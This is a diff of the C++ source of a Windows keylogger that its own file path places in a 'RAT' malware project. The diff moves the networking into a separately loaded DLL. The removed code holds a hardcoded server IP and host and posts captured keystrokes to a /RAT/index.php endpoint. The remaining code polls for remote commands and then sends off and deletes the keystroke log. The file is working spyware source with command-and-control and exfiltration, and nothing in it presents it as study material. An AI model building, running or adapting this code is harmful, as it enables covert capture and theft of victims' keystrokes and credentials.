@@ -1,5 +1,4 @@
-//cl /EHsc .\keylogger.cpp /link ws2_32.lib user32.lib kernel32.lib /OUT:keylogger.exe
-#include <winsock2.h>
+//cl /EHsc .\keylogger.cpp /link ws2_32.lib user32.lib /OUT:keylogger.exe
 #include <windows.h>
 #include <psapi.h>
 #include <iostream>
@@ -7,16 +6,22 @@
 #include <fstream>
 #include <sstream>
 #include <mutex>
-#include <ws2tcpip.h>
 #include <codecvt>
+#include <vector>
 
 using namespace std;
-#pragma comment(lib, "ws2_32.lib")
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-SOCKET sock;
-std::mutex socketMutex; 
-void safe_closesocket(SOCKET &clientSocket);
+typedef int (*SendDataFunc)(const std::string&, const std::string&);
+typedef string (*RecvDataFunc)(const std::string&);
+typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
+
+SendDataFunc send_data;
+RecvDataFunc receive_data;
+RecvDataRawFunc receive_data_raw;
+
+LPCSTR dllPath = "C:\\malware\\RAT Windows\\network_lib.dll";
+HINSTANCE hDLL;
 
 bool running = true;
 
@@ -26,10 +31,6 @@ HHOOK mouseHook;                                                               /
 
 std::ofstream outputFile("keystrokes.txt", std::ios::app);
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-bool socket_setup(SOCKET &clientSocket);
-void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
-string receive_data(SOCKET &clientSocket, const string &filename);
-
 
 BOOL CtrlHandler(DWORD fdwCtrlType);
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
@@ -52,9 +53,36 @@ std::string readFile(const std::string& filename)
   return buffer.str();
 }
 
-int main()
+int load_dll()
 {
-    bool receivedTerminationSignal = false;
+    hDLL = LoadLibraryA(dllPath);
+    if (hDLL == NULL)
+    {
+        printf("Failed to load DLL: %d\n", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
+    receive_data = (RecvDataFunc)GetProcAddress(hDLL, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
+    send_data = (SendDataFunc)GetProcAddress(hDLL, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
+
+    if (!receive_data || !send_data || !receive_data_raw)
+    {
+        std::cerr << "Failed to get one or more function addresses.\n";
+        FreeLibrary(hDLL);
+        return 1;
+    }
+
+    return 0;
+}
+
+int main(int argc, char* argv[])
+{
+    std::atomic<bool> receivedTerminationSignal(false);
+    
+    if (load_dll() != 0)return 1;
+    //cout << "DLL loaded successfully.\n";
+
     // Set the console control handler
     if (!SetConsoleCtrlHandler(CtrlHandler, TRUE))
     {
@@ -79,14 +107,14 @@ int main()
     {
         while (true)
         {
-            string a = receive_data(sock, "klogger_cmd.txt");
+            string a = receive_data("klogger_cmd.txt");
             if (a[0] == 's')
             {
                 receivedTerminationSignal = true;
-                send_data(sock,"klogger_cmd.txt","`");
+                send_data("klogger_cmd.txt","`");
 
                 string contents = readFile("keystrokes.txt");
-                send_data(sock,"key_strokes.txt",contents);
+                send_data("key_strokes.txt",contents);
 
                 outputFile.close();
                 remove("keystrokes.txt");
@@ -104,6 +132,9 @@ int main()
     {
         if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE))
         {
+            std::this_thread::sleep_for(std::chrono::milliseconds(10));
+        }
+        {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
@@ -118,6 +149,9 @@ int main()
     outputFile.close();
 
     //std::cout << "Exiting program." << std::endl; //Confirmation message
+
+    FreeLibrary(hDLL);
+    //cout << "\nDll Unloaded.\n";
 
     return 0;
 }
@@ -446,213 +480,4 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     }
 
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
-}
-
-bool socket_setup(SOCKET &clientSocket)
-{
-    bool connected = false;
-
-    WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
-    {
-        std::cerr << "WSAStartup failed.\n";
-        return false;
-    }
-
-    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (clientSocket == INVALID_SOCKET)
-    {
-        std::cerr << "socket failed.\n";
-        WSACleanup();
-        return false;
-    }
-
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(80);
-    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
-
-    connected = false;
-    while (!connected)
-    {
-        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            if (error != WSAECONNREFUSED)
-            {
-                std::stringstream ss;
-                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
-                std::cerr << ss.str();
-            }   
-            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
-            Sleep(2000);
-        }
-        else
-        {
-            //std::cout << "Connected to the server!\n";
-            connected = true;
-        }
-    }
-    return true;
-}
-
-void safe_closesocket(SOCKET &clientSocket)
-{
-    if (clientSocket != INVALID_SOCKET)
-    {
-        shutdown(clientSocket, SD_BOTH);
-        closesocket(clientSocket);
-        
-        clientSocket = INVALID_SOCKET;
-    }
-}
-
-void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
-{
-    {
-        lock_guard<mutex> lock1(socketMutex); 
-        
-        socket_setup(clientSocket);
-
-        string whole_data = filename+data;
-        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";
-        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
-        httpRequest += "Content-Type: application/octet-stream\r\n";
-        httpRequest += "Connection: close\r\n\r\n";
-        httpRequest += whole_data;                                                                // Append the actual data
-
-
-        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-        if (bytesSent == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-        }
-    
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
-
-        char buffer[4096]; // Increased buffer size
-        string receivedData;
-        int bytesReceived;
-
-        do {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
-            if (bytesReceived > 0) {
-                buffer[bytesReceived] = '\0';
-                receivedData += buffer; // Append to the received data
-            } else if (bytesReceived == 0) {
-                cerr << "Connection closed by server." << endl;
-                break; // Exit the loop on clean close
-            } else {
-                int error = WSAGetLastError();
-                if (error != WSAECONNRESET) {
-                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-                }
-                break; // Exit loop on error
-            }
-        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
-        //cout << "\n\nReceived: " << receivedData << endl;
-
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
-
-        safe_closesocket(clientSocket);
-    }
-}
-
-string receive_data(SOCKET &clientSocket, const string &filename)
-{
-    {
-        lock_guard<mutex> lock1(socketMutex);
-
-        socket_setup(clientSocket);
-
-        string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";
-        httpRequest += "Connection: close\r\n\r\n";
-
-        //cout<< httpRequest<<endl;
-
-        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-        if (bytesSent == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-        }
-
-        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-        char buffer[4096]; // Increased buffer size
-        string receivedData;
-        int bytesReceived;
-
-        do
-        {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
-            if (bytesReceived > 0)
-            {
-                buffer[bytesReceived] = '\0';
-                receivedData += buffer; // Append to the received data
-            } 
-            else if (bytesReceived == 0) 
-            {
-                cerr << "Connection closed by server." << endl;
-                break; // Exit the loop on clean close
-            } 
-            else 
-            {
-                int error = WSAGetLastError();
-                if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-                break; // Exit loop on error
-            }
-        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
-        //cout << "\n\nReceived: \n" << receivedData << endl;
-
-        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-        // Robust HTTP response parsing
-        size_t headerEnd = receivedData.find("\r\n\r\n");
-        if (headerEnd == string::npos) {
-            cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
-            return "";
-        }
-
-        string body = receivedData.substr(headerEnd + 4);
-
-        //Handle chunked transfer encoding (if present)
-        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
-        if (transferEncodingPos != string::npos)
-        {
-            string unchunkedBody;
-            istringstream bodyStream(body);
-            string chunkLengthStr;
-
-            while (getline(bodyStream, chunkLengthStr))
-            {
-                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;
-
-                size_t chunkSize;
-                stringstream ss;
-                ss << hex << chunkLengthStr;
-                ss >> chunkSize;
-
-                if (chunkSize == 0) break; // End of chunked data
-
-                string chunkData(chunkSize, '\0');
-                bodyStream.read(&chunkData[0], chunkSize);
-
-                unchunkedBody += chunkData;
-                bodyStream.ignore(2); // Consume CRLF after chunk
-            }
-            body = unchunkedBody;
-        }
-        safe_closesocket(clientSocket);
-
-        return body;
-
-    }
 }
